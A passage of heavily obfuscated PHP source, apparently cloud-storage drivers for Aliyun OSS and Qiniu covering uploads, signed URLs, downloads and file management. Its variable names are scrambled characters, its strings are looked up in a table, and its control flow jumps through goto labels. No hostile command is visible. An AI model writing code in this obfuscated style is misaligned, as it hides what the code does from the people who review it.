$bÄêøÚÍÎÆ = empty($C ¬ëˆøò†) ? $D¤³İ•…Ô[1184] : $C ¬ëˆøò†; $e©¢²æé„‡ = array($D¤³İ•…Ô[34], $D¤³İ•…Ô[181], $D¤³İ•…Ô[1183], $D¤³İ•…Ô[1184]); if (!in_array($bÄêøÚÍÎÆ, $e©¢²æé„‡)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($B”Ö”°öˆÔ), $bÄêøÚÍÎÆ); } catch (OSS\Core\OssException $Aõì¬°Î¾) { return !1; } return !0; } public function getContent($CÖ°ÏÅÏÂ) { return $this->fileSubstr($CÖ°ÏÅÏÂ, -1); } public function setContent($Döù‘™ê˜‡, $Dæ”‹öİ§  = '') { $dÜ…ì¾­ê¹ =& $_SERVER[Ìó]; try { $E–Ê–ßòĞ¿ = $this->trafficLimit($dÜ…ì¾­ê¹[1185]); $b§–“Ï˜Ä = $this->client->putObject($this->bucket, $this->pathEncode($Döù‘™ê˜‡), $Dæ”‹öİ§ , $E–Ê–ßòĞ¿); } catch (OSS\Core\OssException $Bäˆâ¸Ãƒ) { return !1; } $D¤­äÂµà­ = array($dÜ…ì¾­ê¹[1172] => trim($b§–“Ï˜Ä[$dÜ…ì¾­ê¹[1186]], $dÜ…ì¾­ê¹[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Döù‘™ê˜‡))); $this->updateObjMeta($Döù‘™ê˜‡, $D¤­äÂµà­); return isset($b§–“Ï˜Ä[$dÜ…ì¾­ê¹[1187]][$dÜ…ì¾­ê¹[1134]]) ? (int) $b§–“Ï˜Ä[$dÜ…ì¾­ê¹[1187]][$dÜ…ì¾­ê¹[1134]] : strlen($b§–“Ï˜Ä); } private function updateObjMeta($aÈğ§¶Šå, $CŠÀİ—åùè) { $aÈğ§¶Šå = $this->pathEncode($aÈğ§¶Šå); try { $A±µÀ¶Êª½ = array(OSS\OssClient::OSS_HEADERS => $CŠÀİ—åùè); $this->client->copyObject($this->bucket, $aÈğ§¶Šå, $this->bucket, $aÈğ§¶Šå, $A±µÀ¶Êª½); } catch (OSS\Core\OssException $EŠö¢ß¢ÈŒ) { return !1; } return !0; } public function upload($ašã‚ä‡Œ¹, $aÇ›Ãà‰í÷, $cä„®’‹¹ˆ = false, $F£Ìéæ³Æ¾ = REPEAT_REPLACE) { $aƒ™Ğœ„¸œ =& $_SERVER[Ìó]; $aøù¨çŠƒ´ = trim($ašã‚ä‡Œ¹, $aƒ™Ğœ„¸œ[8]); $D¦¼Õ Ç•… = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($aƒ™Ğœ„¸œ[1172] => @md5_file($aÇ›Ãà‰í÷)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ašã‚ä‡Œ¹))); $D¦¼Õ Ç•… = $this->trafficLimit($aƒ™Ğœ„¸œ[1185], $D¦¼Õ Ç•…); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($aøù¨çŠƒ´), $aÇ›Ãà‰í÷, $D¦¼Õ Ç•…); } catch (OSS\Core\OssException $D‡­²‰ë¤) { return !1; } return $this->getPathOuter($ašã‚ä‡Œ¹); } public function getHost() { $E¸†ó®¨÷× =& $_SERVER[Ìó]; $f³òÍ¡¢®• = explode($E¸†ó®¨÷×[167], parent::getHost()); return $f³òÍ¡¢®•[0] . $E¸†ó®¨÷×[167] . $this->bucket . $E¸†ó®¨÷×[91] . $f³òÍ¡¢®•[1]; } public function uploadFormData($eØÉÀ·©ƒ, $E„ŒÊ‘Ÿæ¾ = 3600) { goto cäå—àšØÉ; d‡Ã†Õ½¥Å: $a˜Şâ¸Ş‚ = date($B…”ŞÙ¥¬…[1188], time() + $AŸï¤šÚŠ); $F·²­ö…”æ = new DateTime($a˜Şâ¸Ş‚); $D»·öÔ±ã´ = $F·²­ö…”æ->format(DateTime::ISO8601); goto D‹Œ·ã§‡˜; D‹Œ·ã§‡˜: $bÙ°÷éºíô = strpos($D»·öÔ±ã´, $B…”ŞÙ¥¬…[280]); $D»·öÔ±ã´ = substr($D»·öÔ±ã´, 0, $bÙ°÷éºíô) . $B…”ŞÙ¥¬…[1189]; $EÁ¥„Ô–¡ = 1048576000 * 5; goto Cˆ‰Ä•Ø¹; cäå—àšØÉ: $B…”ŞÙ¥¬… =& $_SERVER[Ìó]; if (!($A‘èµÓŞÅ = $this->getHost())) { return !1; } $AŸï¤šÚŠ = $E„ŒÊ‘Ÿæ¾; goto d‡Ã†Õ½¥Å; CÊ•Ø‹óŞò: $FÅÌÀÅèã = base64_encode(hash_hmac($B…”ŞÙ¥¬…[214], $Dåš‘Ì¾â, $this->secret, !0)); $c‹»†©¿Ó = array($B…”ŞÙ¥¬…[1101] => $Dåš‘Ì¾â, $B…”ŞÙ¥¬…[1191] => $this->accessKey, $B…”ŞÙ¥¬…[1097] => $B…”ŞÙ¥¬…[1089], $B…”ŞÙ¥¬…[1192] => $FÅÌÀÅèã, $B…”ŞÙ¥¬…[165] => $A‘èµÓŞÅ); $c‹»†©¿Ó = $this->trafficLimit($B…”ŞÙ¥¬…[1185], $c‹»†©¿Ó); goto EÉó¢¥œˆ; Cˆ‰Ä•Ø¹: $bé¡˜Ñ¥Öï = $this->pathFather($eØÉÀ·©ƒ); $BñÌ‹è½²  = array($B…”ŞÙ¥¬…[1091] => $D»·öÔ±ã´, $B…”ŞÙ¥¬…[1092] => array(array($B…”ŞÙ¥¬…[1190], 0, $EÁ¥„Ô–¡), array($B…”ŞÙ¥¬…[1095], $B…”ŞÙ¥¬…[1096], $bé¡˜Ñ¥Öï))); $Dåš‘Ì¾â = base64_encode(json_encode($BñÌ‹è½² )); goto CÊ•Ø‹óŞò; EÉó¢¥œˆ: return $c‹»†©¿Ó; goto Cƒ÷£»ò; Cƒ÷£»ò: } public function multiUploadFormData($B¦¬ÛòÃÃŒ, $dšÏÎã…„ = 3600) { $b…¢Ï¨Ê Ñ =& $_SERVER[Ìó]; if (!($D©‹´ç‚ô = $this->getHost())) { return !1; } $f¯ÖÃÚŸïõ = $this->trafficLimit($b…¢Ï¨Ê Ñ[1185]); $C‡¥×ÀãÇ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B¦¬ÛòÃÃŒ), $f¯ÖÃÚŸïõ); return array($b…¢Ï¨Ê Ñ[205] => $C‡¥×ÀãÇ, $b…¢Ï¨Ê Ñ[165] => $D©‹´ç‚ô . $b…¢Ï¨Ê Ñ[8] . $this->pathEncode($B¦¬ÛòÃÃŒ), $b…¢Ï¨Ê Ñ[206] => gmdate($b…¢Ï¨Ê Ñ[1193]), $b…¢Ï¨Ê Ñ[89] => $B¦¬ÛòÃÃŒ); } public function multiUploadAuthData($aĞØ¿ÎªÎİ, $Bè·‹Ô¥Èò = array()) { goto FºĞ¾¯ã¬; a‘¼ŞØùÔ÷: $a‚Ùé íÅ„ = $aĞØ¿ÎªÎİ; if (isset($Bè·‹Ô¥Èò[$B”¸£ëÔË[89]])) { $a‚Ùé íÅ„ = $Bè·‹Ô¥Èò[$B”¸£ëÔË[89]]; unset($Bè·‹Ô¥Èò[$B”¸£ëÔË[89]]); } if (isset($Bè·‹Ô¥Èò[$B”¸£ëÔË[207]])) { $Bè·‹Ô¥Èò[$B”¸£ëÔË[206]] = $b¡¢ÖÇ“‹; return $this->listUploadParts($a‚Ùé íÅ„, $Bè·‹Ô¥Èò); } goto c«Âá¨ŞÙ»; FºĞ¾¯ã¬: $B”¸£ëÔË =& $_SERVER[Ìó]; $b¡¢ÖÇ“‹ = isset($Bè·‹Ô¥Èò[$B”¸£ëÔË[206]]) ? $Bè·‹Ô¥Èò[$B”¸£ëÔË[206]] : gmdate($B”¸£ëÔË[1193]); $f¯„ò’ÎÛ¯ = isset($Bè·‹Ô¥Èò[$B”¸£ëÔË[156]]) ? $Bè·‹Ô¥Èò[$B”¸£ëÔË[156]] : $B”¸£ëÔË[33]; goto a‘¼ŞØùÔ÷; EÓÏ¡Ñ÷”à: if (!empty($Bè·‹Ô¥Èò[$B”¸£ëÔË[1195]])) { $A‰Ê¡ª‡ˆˆ = array_merge(array($Aë‘Ü¨²Ü[4]), $Bè·‹Ô¥Èò[$B”¸£ëÔË[1195]]); sort($A‰Ê¡ª‡ˆˆ); $Aë‘Ü¨²Ü[4] = implode($B”¸£ëÔË[213], $A‰Ê¡ª‡ˆˆ); } $c«ëÚÚ¦ô« = implode($B”¸£ëÔË[213], $Aë‘Ü¨²Ü); $Bğ»Íë¹íİ = base64_encode(hash_hmac($B”¸£ëÔË[214], $c«ëÚÚ¦ô«, $this->secret, !0)); goto eˆâòÖàĞ; c«Âá¨ŞÙ»: $Aë‘Ü¨²Ü = array($B”¸£ëÔË[208], $B”¸£ëÔË[33], $B”¸£ëÔË[115], $b¡¢ÖÇ“‹, "\170\x2d\157\163\163\x2d\x64\141\x74\x65\72{$b¡¢ÖÇ“‹}", $B”¸£ëÔË[8] . $this->bucket . $B”¸£ëÔË[8] . $a‚Ùé íÅ„ . $f¯„ò’ÎÛ¯); if (strpos($f¯„ò’ÎÛ¯, $B”¸£ëÔË[209]) === 0) { $Aë‘Ü¨²Ü[0] = $B”¸£ëÔË[210]; if ($e‹Ù·ñ³ßÎ = $this->trafficLimit($B”¸£ëÔË[1185])) { $a‚Ùé íÅ„ = $B”¸£ëÔË[1194]; array_splice($Aë‘Ü¨²Ü, 5, 0, $a‚Ùé íÅ„ . $B”¸£ëÔË[4] . $e‹Ù·ñ³ßÎ[$a‚Ùé íÅ„]); } } if (isset($Bè·‹Ô¥Èò[$B”¸£ëÔË[211]]) && $Bè·‹Ô¥Èò[$B”¸£ëÔË[211]] == $B”¸£ëÔË[212]) { $Aë‘Ü¨²Ü[0] = $B”¸£ëÔË[212]; } goto EÓÏ¡Ñ÷”à; eˆâòÖàĞ: $aÌí‹ì²Ó© = $B”¸£ëÔË[1196] . $this->accessKey . $B”¸£ëÔË[4] . $Bğ»Íë¹íİ; if (strpos($f¯„ò’ÎÛ¯, $B”¸£ëÔË[209]) === 0) { $aÌí‹ì²Ó© = array($B”¸£ëÔË[216] => $aÌí‹ì²Ó©, $B”¸£ëÔË[206] => $b¡¢ÖÇ“‹); if ($e‹Ù·ñ³ßÎ) { $aÌí‹ì²Ó© = array_merge($aÌí‹ì²Ó©, $e‹Ù·ñ³ßÎ); } } return $aÌí‹ì²Ó©; goto Càéîº³Š„; Càéîº³Š„: } public function listUploadParts($f««Ã’µ‰³, $F—â‹®ƒ­É) { goto eå‘óÊ™å‘; Eò’»ì²Àï: return array($bˆí­ƒî[216] => $dˆ½ôÅšÜÕ, $bˆí­ƒî[206] => $F—â‹®ƒ­É[$bˆí­ƒî[206]], $bˆí­ƒî[218] => $Dø‘¬—¾‹—); goto FÍŒÅ©à×; d¦æåë”Šï: unset($F—â‹®ƒ­É[$bˆí­ƒî[207]], $F—â‹®ƒ­É[$bˆí­ƒî[211]]); $dˆ½ôÅšÜÕ = $this->multiUploadAuthData($f««Ã’µ‰³, $F—â‹®ƒ­É); if (empty($dˆ½ôÅšÜÕ)) { return !1; } goto Eò’»ì²Àï; F‘Ø¯øè•: $FŸ†Œ•×£¿ = $c¥÷öõ»ìš->getListPart(); $Dø‘¬—¾‹— = array(); foreach ($FŸ†Œ•×£¿ as $fµõğÖ÷¡) { $Dø‘¬—¾‹—[] = array($bˆí­ƒî[1176] => $fµõğÖ÷¡->getPartNumber(), $bˆí­ƒî[1177] => trim($fµõğÖ÷¡->getETag(), $bˆí­ƒî[112])); } goto d¦æåë”Šï; eå‘óÊ™å‘: $bˆí­ƒî =& $_SERVER[Ìó]; $e¹ÓåÉô¿Å = parse_url_query($F—â‹®ƒ­É[$bˆí­ƒî[156]]); $c¥÷öõ»ìš = $this->client->listParts($this->bucket, $this->pathEncode($f««Ã’µ‰³), $e¹ÓåÉô¿Å[$bˆí­ƒî[205]]); goto F‘Ø¯øè•; FÍŒÅ©à×: } public function download($dÓœ¼Ë÷‡, $A¥ôŒ†Æ”ç) { if ($this->isFolder($dÓœ¼Ë÷‡)) { return !1; } try { $fªŸÃ¦â = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $A¥ôŒ†Æ”ç); $fªŸÃ¦â = $this->trafficLimit($_SERVER[Ìó][104], $fªŸÃ¦â); $this->client->getObject($this->bucket, $this->pathEncode($dÓœ¼Ë÷‡), $fªŸÃ¦â); } catch (OSS\Core\OssException $Fõ…§Úò‘ø) { return !1; } return $A¥ôŒ†Æ”ç; } public function fileSubstr($F´¬ëßÁÀğ, $FŠ°Ë¨¥¼å = 0, $b¡óò¹íƒ¨ = false) { if ($FŠ°Ë¨¥¼å === -1) { $dšÁŞĞª‹° = array(); } else { if ($b¡óò¹íƒ¨ === !1) { $dÄéõ¯ğÔÖ = $this->size($F´¬ëßÁÀğ); } else { $dÄéõ¯ğÔÖ = $FŠ°Ë¨¥¼å + $b¡óò¹íƒ¨ - 1; } $dšÁŞĞª‹° = array(OSS\OssClient::OSS_RANGE => "{$FŠ°Ë¨¥¼å}\x2d{$dÄéõ¯ğÔÖ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($F´¬ëßÁÀğ), $dšÁŞĞª‹°); } catch (OSS\Core\OssException $d« ×³‚†¿) { think_exception($d« ×³‚†¿->getMessage()); return !1; } } private function trafficLimit($f£Ó‹ÀÔê±, $Dö¤¨Ğ„ç‚ = array()) { goto b‘¨÷½á¦¾; b‘¨÷½á¦¾: $c ‚”Ä©Ò— =& $_SERVER[Ìó]; if ($f£Ó‹ÀÔê± == $c ‚”Ä©Ò—[1185] && $this->isUploadServer() || $f£Ó‹ÀÔê± == $c ‚”Ä©Ò—[104] && $this->isFileOutServer()) { return $Dö¤¨Ğ„ç‚; } $a„ÉÌ¢áÆ­ = floatval($GLOBALS[$c ‚”Ä©Ò—[6]][$c ‚”Ä©Ò—[84]][$c ‚”Ä©Ò—[102]][$f£Ó‹ÀÔê±]) * 1024 * 1024 * 8; goto E˜ªã·õ; E˜ªã·õ: if (!$a„ÉÌ¢áÆ­) { return $Dö¤¨Ğ„ç‚; } $a„ÉÌ¢áÆ­ = $a„ÉÌ¢áÆ­ < 819200 ? 819200 : ($a„ÉÌ¢áÆ­ > 838860800 ? 838860800 : $a„ÉÌ¢áÆ­); $Dö¤¨Ğ„ç‚[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($a„ÉÌ¢áÆ­); goto DŒ˜‡‘‡¤Ø; DŒ˜‡‘‡¤Ø: return $Dö¤¨Ğ„ç‚; goto dÜ‘Ú‚ØÑå; dÜ‘Ú‚ØÑå: } public function link($B£˜ÏØ½ã, $D¼µÊ¬†À = array()) { $A‰ìŞÇŒ¾â =& $_SERVER[Ìó]; if (!$this->exist($B£˜ÏØ½ã) || $this->isFolder($B£˜ÏØ½ã)) { return !1; } try { $D¼µÊ¬†À = $this->trafficLimit($A‰ìŞÇŒ¾â[104], $D¼µÊ¬†À); $eçíùËğ¬Ó = $this->client->signUrl($this->bucket, $this->pathEncode($B£˜ÏØ½ã), 3600 * 12, $A‰ìŞÇŒ¾â[212], $D¼µÊ¬†À); return $this->getCdnLink($eçíùËğ¬Ó); } catch (OSS\Core\OssException $c”ÂÙ†ˆ¬×) { return !1; } } public function fileOut($b¯‘£Â±š, $cÂ¢¾Œİ¬ = false, $a£Öó¶éÒ‘ = false, $Có¸¤„× = '') { goto AŠÇñÈÇòÂ; AŠÇñÈÇòÂ: $b¨“µ©Ú½÷ =& $_SERVER[Ìó]; if (!$a£Öó¶éÒ‘) { $a£Öó¶éÒ‘ = $this->pathThis($b¯‘£Â±š); } $a£Öó¶éÒ‘ = rawurlencode($a£Öó¶éÒ‘); goto aİÔ³‘Êª—; eğÍò¨¾Ö: $this->fileOutLink($fë¤¹ïè‡Ê); goto c¶„ì „; c±³Â¨¶¯ƒ: $d»òæñèŒÁ = array(OSS\OssClient::OSS_SUB_RESOURCE => $b¨“µ©Ú½÷[1197] . rawurlencode("{$cÂ¢¾Œİ¬}\x3b\x66\x69\154\145\156\x61\155\x65\75{$a£Öó¶éÒ‘}")); $d»òæñèŒÁ[OSS\OssClient::OSS_SUB_RESOURCE] .= $b¨“µ©Ú½÷[1198] . $cÒî¶È¿…¦; $fë¤¹ïè‡Ê = $this->link($b¯‘£Â±š, $d»òæñèŒÁ); goto eğÍò¨¾Ö; aİÔ³‘Êª—: $cÒî¶È¿…¦ = get_file_mime(get_path_ext($a£Öó¶éÒ‘)); if ($cÒî¶È¿…¦ == $b¨“µ©Ú½÷[197]) { return parent::fileOut($b¯‘£Â±š, $cÂ¢¾Œİ¬, $a£Öó¶éÒ‘, $Có¸¤„×); } $cÂ¢¾Œİ¬ = $cÂ¢¾Œİ¬ ? $b¨“µ©Ú½÷[198] : $b¨“µ©Ú½÷[199]; goto c±³Â¨¶¯ƒ; c¶„ì „: } public function fileOutServer($e™ŠÄõ²—½, $D¨ÀÉç÷…§ = false, $bšœ•Œ‹å = false, $A¸¨Ãç„“ = '') { parent::fileOut($e™ŠÄõ²—½, $D¨ÀÉç÷…§, $bšœ•Œ‹å, $A¸¨Ãç„“); } public function fileOutImage($D™èƒˆÒ÷Ê, $E„°íÊêÒ‚ = 250) { $A·†·ÜåÔ¹ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ìó][1199] . $E„°íÊêÒ‚); $eæ”“¿ºè = $this->link($D™èƒˆÒ÷Ê, $A·†·ÜåÔ¹); $this->fileOutLink($eæ”“¿ºè); } public function fileOutImageServer($eÂß×§°ß‹, $FÕçÆ¬Ëñù = 250) { parent::fileOutImage($eÂß×§°ß‹, $FÕçÆ¬Ëñù); } public function fileOutLink($c‚ÓÔ¤İí) { $e’° ÚŸ÷ò =& $_SERVER[Ìó]; if (!$this->isCdnHost() && substr($c‚ÓÔ¤İí, 0, 7) == $e’° ÚŸ÷ò[1104]) { $c‚ÓÔ¤İí = $e’° ÚŸ÷ò[1105] . substr($c‚ÓÔ¤İí, 7); } header($e’° ÚŸ÷ò[152] . $c‚ÓÔ¤İí); die; } public function hashMd5($c§¸ÕØìŠ, $c‹„¤çèÛÄ = '') { $fï½óáåù  =& $_SERVER[Ìó]; $fäÂÈ‡†äŞ = $this->objectMeta($c§¸ÕØìŠ); if (!$fäÂÈ‡†äŞ) { return $fï½óáåù [33]; } if (!isset($fäÂÈ‡†äŞ[$fï½óáåù [1172]]) && !empty($c‹„¤çèÛÄ)) { $b³©‘ÑæÜ¥ = $this->updateObjMeta($c§¸ÕØìŠ, array($fï½óáåù [1172] => $c‹„¤çèÛÄ)); $fäÂÈ‡†äŞ[$fï½óáåù [1172]] = $b³©‘ÑæÜ¥ ? $c‹„¤çèÛÄ : $fï½óáåù [33]; } return isset($fäÂÈ‡†äŞ[$fï½óáåù [1172]]) ? strtolower($fäÂÈ‡†äŞ[$fï½óáåù [1172]]) : $fï½óáåù [33]; } public function size($b¢ç÷ç„„) { $cø¬ĞÜÛï‚ = $this->objectMeta($b¢ç÷ç„„); return $cø¬ĞÜÛï‚ ? $cø¬ĞÜÛï‚[$_SERVER[Ìó][77]] : 0; } public function info($F”¯‡Ö½™) { if ($this->isFolder($F”¯‡Ö½™)) { return $this->folderInfo($F”¯‡Ö½™); } else { if ($this->isFile($F”¯‡Ö½™)) { return $this->fileInfo($F”¯‡Ö½™); } } return !1; } public function exist($Cµá»Û×‚Ö) { return $this->isFile($Cµá»Û×‚Ö) || $this->isFolder($Cµá»Û×‚Ö); } public function isFile($eÕ•¤³¯×Ó) { return !$this->isFolder($eÕ•¤³¯×Ó) && $this->objectMeta($eÕ•¤³¯×Ó); } public function isFolder($C‘’­˜†±) { return $this->cacheMethod($_SERVER[Ìó][219], $C‘’­˜†±); } protected function objectMeta($c†§™Óªğ¹) { return $this->cacheMethod($_SERVER[Ìó][220], $c†§™Óªğ¹); } protected function _objectMeta($cÉß¡ äø‚) { $F§Ì˜·õÈë =& $_SERVER[Ìó]; try { $eîãªØ¼‰ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cÉß¡ äø‚)); } catch (OSS\Core\OssException $BÖ•‚Î‹) { $eîãªØ¼‰ = !1; } if ($eîãªØ¼‰) { $eîãªØ¼‰[$F§Ì˜·õÈë[77]] = intval($eîãªØ¼‰[$F§Ì˜·õÈë[1179]]); } return $eîãªØ¼‰; } protected function _isFolder($cõÕæ¦µŸ) { $CÀ•óù³× =& $_SERVER[Ìó]; if ($cõÕæ¦µŸ == $CÀ•óù³×[33] || $cõÕæ¦µŸ == $CÀ•óù³×[8]) { return !0; } $Dß¨çÌ’Ï = array($CÀ•óù³×[1169] => $CÀ•óù³×[8], $CÀ•óù³×[182] => rtrim($cõÕæ¦µŸ, $CÀ•óù³×[8]) . $CÀ•óù³×[8], $CÀ•óù³×[1170] => 1, $CÀ•óù³×[1171] => $CÀ•óù³×[33]); $Eõ­Õˆ²î¡ = $this->client->listObjects($this->bucket, $Dß¨çÌ’Ï); if ($Eõ­Õˆ²î¡->getObjectList() || $Eõ­Õˆ²î¡->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($a„Ñïø‰) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ìó][1200]; $this->_init($a„Ñïø‰); } public function _init($C°ä×ğ¿³) { foreach ($C°ä×ğ¿³ as $AÓŞ¹”İŒ => $E—›¼À˜ ) { if (isset($this->{$AÓŞ¹”İŒ})) { $this->{$AÓŞ¹”İŒ} = $E—›¼À˜ ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ìó][1201], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($EÜŞåªµ·Ò, $b÷ƒÛƒÆÚ = '', $F¢Û¼Ïë×Â = REPEAT_RENAME) { if ($this->setContent($EÜŞåªµ·Ò, $b÷ƒÛƒÆÚ)) { return $this->getPathOuter($EÜŞåªµ·Ò); } return !1; } public function mkdir($A‘¸¾òÑ¶ƒ, $F®¿¸‰°ë† = REPEAT_SKIP) { goto A–ñôª¦ë; cóì”„—ÎÂ: if (!$this->mkfile($eªîš›ÇóË)) { return !1; } if (!$this->moveFile($eªîš›ÇóË, $A‘¸¾òÑ¶ƒ)) { $this->delFile($eªîš›ÇóË); return !1; } return $this->getPathOuter($c ÷†Ğ‚Ÿˆ); goto Aëä™ÍÙ¢ê; b‘®Á”†¢’: $A‘¸¾òÑ¶ƒ = $c ÷†Ğ‚Ÿˆ . $cóƒœÂ›÷©[8]; $D“Š¨²‹¬  = get_path_this($c ÷†Ğ‚Ÿˆ); $eªîš›ÇóË = $A‘¸¾òÑ¶ƒ . $D“Š¨²‹¬ ; goto cóì”„—ÎÂ; A–ñôª¦ë: $cóƒœÂ›÷© =& $_SERVER[Ìó]; $c ÷†Ğ‚Ÿˆ = trim($A‘¸¾òÑ¶ƒ, $cóƒœÂ›÷©[8]); if ($this->_isFolder($c ÷†Ğ‚Ÿˆ)) { return $this->getPathOuter($c ÷†Ğ‚Ÿˆ); } goto b‘®Á”†¢’; Aëä™ÍÙ¢ê: } public function copyFile($A¾§ÂÙÖ, $c ÌíæÈ) { $fóš±ßÅˆ = $this->bucketManager->copy($this->bucket, $A¾§ÂÙÖ, $this->bucket, $c ÌíæÈ, !0); return $fóš±ßÅˆ ? !1 : !0; } public function moveFile($eô«Ÿ²´®«, $FëíÕÜƒ‹è) { $eŞµ‚ˆ¨à¤ = $this->bucketManager->move($this->bucket, $eô«Ÿ²´®«, $this->bucket, $FëíÕÜƒ‹è, !0); return $eŞµ‚ˆ¨à¤ ? !1 : !0; } public function delFile($B²˜äù…À) { $EÒöÈ‚äƒæ = $this->bucketManager->delete($this->bucket, $B²˜äù…À); return $EÒöÈ‚äƒæ ? !1 : !0; } public function delFolder($B‚ï’Æ¥²·) { $e£µÈÎáî = $this->fileList($B‚ï’Æ¥²·); if (empty($e£µÈÎáî)) { return !0; } $câîŠî­Õ = 1000; if (count($e£µÈÎáî) <= $câîŠî­Õ) { return $this->qnDelObj($e£µÈÎáî) ? !1 : !0; } foreach (array_chunk($e£µÈÎáî, $câîŠî­Õ) as $cÂÙ‡¿‡¨†) { $BÒáÀ¢ùõå = $this->qnDelObj($cÂÙ‡¿‡¨†); if ($BÒáÀ¢ùõå) { return !1; } } return !0; } private function qnDelObj($a©Èß¸Ğ›Ã) { $E¹ôÈ –¡œ = $this->bucketManager->buildBatchDelete($this->bucket, $a©Èß¸Ğ›Ã); list($CŸÇÈï°¹æ, $AŞù³µØ„â) = $this->bucketManager->batch($E¹ôÈ –¡œ); return $AŞù³µØ„â; } private function fileList($E¼ï©ñæ—™, $aÂ¬œ‘öÊ = 0) { goto EñÁ±í½ù»; EñÁ±í½ù»: $f—ë¸Í˜¼¶ =& $_SERVER[Ìó]; $E¼ï©ñæ—™ = trim($E¼ï©ñæ—™, $f—ë¸Í˜¼¶[8]); $cª‚àöØ¨· = empty($E¼ï©ñæ—™) ? $f—ë¸Í˜¼¶[33] : $E¼ï©ñæ—™ . $f—ë¸Í˜¼¶[8]; goto B‚Ú”òŸÍÌ; c²ôİ¦§: $FÂƒšğ¨Û = array(); while (!0) { list($cÊ¦õ±ƒ¸ , $B£¦‰Œ®¾«) = $this->bucketManager->listFiles($this->bucket, $cª‚àöØ¨·, $e’ëŸóˆÍØ, $b—÷ÜÅòØ, $eÑ¦ÌÛš­Ø); if ($B£¦‰Œ®¾«) { return !1; } $e’ëŸóˆÍØ = array_key_exists($f—ë¸Í˜¼¶[1171], $cÊ¦õ±ƒ¸ ) ? $e’ëŸóˆÍØ = $cÊ¦õ±ƒ¸ [$f—ë¸Í˜¼¶[1202]] : $f—ë¸Í˜¼¶[33]; foreach ($cÊ¦õ±ƒ¸ [$f—ë¸Í˜¼¶[1203]] as $cËÚ ¨ìŸ) { $cçŠÈø»— = $cËÚ ¨ìŸ[$f—ë¸Í˜¼¶[89]]; if ($aÂ¬œ‘öÊ) { $cçŠÈø»— = array($f—ë¸Í˜¼¶[28] => $cçŠÈø»—, $f—ë¸Í˜¼¶[77] => $cËÚ ¨ìŸ[$f—ë¸Í˜¼¶[1204]]); } $FÂƒšğ¨Û[] = $cçŠÈø»—; } if ($e’ëŸóˆÍØ == $f—ë¸Í˜¼¶[33]) { break; } } return $FÂƒšğ¨Û; goto DÁ¨¤›åŠ; B‚Ú”òŸÍÌ: $e’ëŸóˆÍØ = $f—ë¸Í˜¼¶[33]; $b—÷ÜÅòØ = 1000; $eÑ¦ÌÛš­Ø = $f—ë¸Í˜¼¶[33]; goto c²ôİ¦§; DÁ¨¤›åŠ: } public function rename($f«ªÇã•É¶, $c£ï¢›ªƒù) { return $this->renameObject($f«ªÇã•É¶, $c£ï¢›ªƒù); } public function fileInfo($D‚ÂˆŞ², $eÇƒãùŸÓ› = false, $F†÷Àª  = array()) { goto A÷ÇÆ—’°æ; fŠĞğôõ²«: return $fï’’‰ÑÅ…; goto A¸¢Ÿ·Ã‚Ü; AÙß‘‘¡ì‘: if (empty($F†÷Àª )) { $F†÷Àª  = $this->objectMeta($D‚ÂˆŞ²); if (!$F†÷Àª ) { return $fï’’‰ÑÅ…; } } if (isset($F†÷Àª [$a¡ç¤¬“Èİ[1205]])) { $fï’’‰ÑÅ…[$a¡ç¤¬“Èİ[183]] = $F†÷Àª [$a¡ç¤¬“Èİ[1205]]; } if (isset($F†÷Àª [$a¡ç¤¬“Èİ[1204]])) { $fï’’‰ÑÅ…[$a¡ç¤¬“Èİ[77]] = $F†÷Àª [$a¡ç¤¬“Èİ[1204]]; } goto fŠĞğôõ²«; A÷ÇÆ—’°æ: $a¡ç¤¬“Èİ =& $_SERVER[Ìó]; if ($eÇƒãùŸÓ›) { return array($a¡ç¤¬“Èİ[28] => $this->pathThis($D‚ÂˆŞ²), $a¡ç¤¬“Èİ[75] => $this->getPathOuter($a¡ç¤¬“Èİ[8] . $D‚ÂˆŞ²), $a¡ç¤¬“Èİ[29] => $a¡ç¤¬“Èİ[163], $a¡ç¤¬“Èİ[77] => isset($F†÷Àª [$a¡ç¤¬“Èİ[1204]]) ? $F†÷Àª [$a¡ç¤¬“Èİ[1204]] : 0, $a¡ç¤¬“Èİ[156] => $this->ext($D‚ÂˆŞ²)); } $fï’’‰ÑÅ… = array($a¡ç¤¬“Èİ[28] => $this->pathThis($D‚ÂˆŞ²), $a¡ç¤¬“Èİ[75] => $this->getPathOuter($a¡ç¤¬“Èİ[8] . $D‚ÂˆŞ²), $a¡ç¤¬“Èİ[29] => $a¡ç¤¬“Èİ[163], $a¡ç¤¬“Èİ[183] => 0, $a¡ç¤¬“Èİ[106] => 0, $a¡ç¤¬“Èİ[77] => 0, $a¡ç¤¬“Èİ[156] => $this->ext($D‚ÂˆŞ²), $a¡ç¤¬“Èİ[184] => !0, $a¡ç¤¬“Èİ[185] => !0); goto AÙß‘‘¡ì‘; A¸¢Ÿ·Ã‚Ü: } public function folderInfo($b‰­Ò½ìõ¹, $bôª‘¤æ = false) { goto DŒ®Ã©ÀÅ·; a·âéªÀ: return $fŠ±Ë˜È±Ò; goto B½òë˜ˆ«¸; B°œÖ: $b‰­Ò½ìõ¹ = 